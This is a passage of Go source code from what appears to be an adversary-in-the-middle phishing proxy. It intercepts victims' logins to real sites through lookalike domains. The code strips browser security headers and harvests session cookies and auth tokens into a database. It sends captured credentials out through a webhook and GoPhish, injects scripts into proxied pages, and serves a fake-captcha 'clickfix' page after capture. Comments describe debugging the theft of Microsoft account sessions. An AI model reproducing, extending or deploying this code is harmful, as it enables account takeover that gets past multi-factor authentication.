													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								for k, v := range req.PostForm {
									for i, vv := range v {
										// patch phishing URLs in POST params with original domains
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
								}

								for k, v := range req.PostForm {
									if len(v) > 0 {
										log.Debug("POST %s = %s", k, v[0])
									}
								}

								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				// check if request should be intercepted
				if pl != nil {
					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
						for _, ic := range pl.intercept {
							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
							}
						}
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								// false-completion guard (chatgpt incident 23-09):
								// an auth_url matching a PRE-LOGIN path (landing,
								// marketing root) must not finish the session on its
								// own — require the required auth tokens first,
								// mirroring the response-side completion check.
								if s.AllCookieAuthTokensCaptured(pl.cookieAuthTokens) {
									s.Finish(true)
								}
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  p.cfg.GetPhishletCookieDomain(ps.PhishletName),
						Expires: time.Now().Add(60 * time.Minute),
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			// (skip gate redirects — their whole point is leaving the phish domain)
			if resp.Header.Get("X-Eg-Gate") != "" {
				resp.Header.Del("X-Eg-Gate")
			} else {
				r_url, err := resp.Location()
				if err == nil {
					if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
						r_url.Host = r_host
						resp.Header.Set("Location", r_url.String())
					}
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*CookieAuthToken
			if pl != nil {
				auth_tokens = pl.cookieAuthTokens
			}
			is_cookie_auth := false
			is_body_auth := false
			is_http_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				// add SameSite=none for every received cookie, allowing cookies through iframes
				if ck.Secure {
					ck.SameSite = http.SameSiteNoneMode
				}

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					at := pl.getAuthToken(c_domain, ck.Name)
					if at != nil {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
								// persist captured cookies to db — otherwise they live
								// only in memory and are lost on restart, and the
								// API/egctl export path (db-backed) shows none
								if p.db != nil {
									if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
										log.Error("db: failed to persist session cookies: %v", err)
									}
								}
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				// Host-only MS cookies (empty Domain attr) must survive host
				// transitions inside the phish flow. Re-emit them domain-wide on
				// the phish base domain — EXCEPT `__Host-` prefixed cookies: per
				// RFC 6265bis a Domain attribute makes the whole cookie INVALID
				// and the browser silently drops it (this exact bug destroyed the
				// MSA consumer session and caused the sign-in loop). __Host-
				// cookies stay host-only on the phish host that issued them.
				if ck.Domain == "" && p.cfg.GetBaseDomain() != "" && !strings.HasPrefix(ck.Name, "__Host-") {
					ck.Domain = p.cfg.GetBaseDomain()
				}
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}

			// rewrite_urls: map origin paths back to victim-facing paths in redirects
			if pl != nil && len(pl.rewriteUrls) > 0 {
				if loc := resp.Header.Get("Location"); loc != "" {
					resp.Header.Set("Location", pl.rewriteUrlOut(loc))
				}
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// capture body response tokens
					for k, v := range pl.bodyAuthTokens {
						if _, ok := s.BodyTokens[k]; !ok {
							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
								//log.Debug("RESPONSE body = %s", string(body))
								token_re := v.search.FindStringSubmatch(string(body))
								if token_re != nil && len(token_re) >= 2 {
									s.BodyTokens[k] = token_re[1]
								}
							}
						}
					}

					// capture http header tokens
					for k, v := range pl.httpAuthTokens {
						if _, ok := s.HttpTokens[k]; !ok {
							hv := resp.Request.Header.Get(v.header)
							if hv != "" {
								s.HttpTokens[k] = hv
							}
						}
					}
				}

				// check if we have all tokens
				if len(pl.authUrls) == 0 {
					if s, ok := p.sessions[ps.SessionId]; ok {
						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
						if is_cookie_auth {
							reqCnt := 0
							for _, tl := range auth_tokens {
								for _, at := range tl {
									if !at.optional {
										reqCnt++
									}
								}
							}
							capInfo := make([]string, 0, len(s.CookieTokens))
							for d, tks := range s.CookieTokens {
								names := make([]string, 0, len(tks))
								for n := range tks {
									names = append(names, n)
								}
								capInfo = append(capInfo, d+"{"+strings.Join(names, ",")+"}")
							}
							log.Warning("completion-check [%d]: host=%s pl=%s required=%d captured=[%s]", ps.Index, req_hostname, pl.Name, reqCnt, strings.Join(capInfo, "; "))
						}
						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
							is_body_auth = true
						}
						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
							is_http_auth = true
						}
					}
				}
			}

			if is_cookie_auth && is_body_auth && is_http_auth {
				// we have all auth tokens
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						log.Success("[%d] all authorization tokens intercepted!", ps.Index)

						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
							log.Error("database: %v", err)
						}
						go p.SendCredWebhook(pl, s)
						s.Finish(false)

						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
							rid, ok := s.Params["rid"]
							if ok && rid != "" {
								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
								if err != nil {
									log.Error("gophish: %s", err)
								}
							}
						}
					}
				}
			}

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
						body = []byte(removeObfuscatedDots(string(body)))
					}
				}

				if stringExists(mime, []string{"text/html"}) {

					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
							}
							if p.botguard && !p.bgIsVerified(s.Id) {
								body = p.injectJavascriptIntoBody(body, p.bgProbeScript(s.Id), "")
							}

							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
						}
					}
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
							}

							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
								rid, ok := s.Params["rid"]
								if ok && rid != "" {
									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
									if err != nil {
										log.Error("gophish: %s", err)
									}
								}
							}
							break
						}
					}
				}
			}

			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
				resp.Header.Set("Cache-Control", "no-cache, no-store")
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							// clickfix post-auth gate: serve the fake-captcha page
							// instead of the JS redirect after credentials captured
							if cf := pl.ClickFix(); cf != nil && cf.Position == "after" {
								_, resp := p.serveClickFixAfter(resp.Request, cf, s.RedirectURL)
								return resp
							}
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)

							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
							return resp
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

type dumbResponseWriter struct {
	net.Conn
}
